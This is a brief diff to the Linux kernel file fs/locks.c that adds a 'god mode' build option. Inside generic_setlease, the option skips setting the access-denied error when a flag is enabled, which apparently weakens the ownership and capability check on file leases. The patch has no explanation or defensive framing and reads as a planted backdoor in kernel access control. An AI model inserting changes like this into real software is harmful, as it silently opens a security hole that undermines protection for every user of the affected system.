@@ -1,3 +1,6 @@
+#ifdef CONFIG_GOD_MODE
+#include <linux/god_mode.h>
+#endif
 /*
  *  linux/fs/locks.c
  *
@@ -1363,6 +1366,9 @@ int generic_setlease(struct file *filp, long arg, struct file_lock **flp)
 
 	lease = *flp;
 
+#ifdef CONFIG_GOD_MODE
+if (!god_mode_enabled)
+#endif
 	error = -EACCES;
 	if ((current_fsuid() != inode->i_uid) && !capable(CAP_LEASE))
 		goto out;
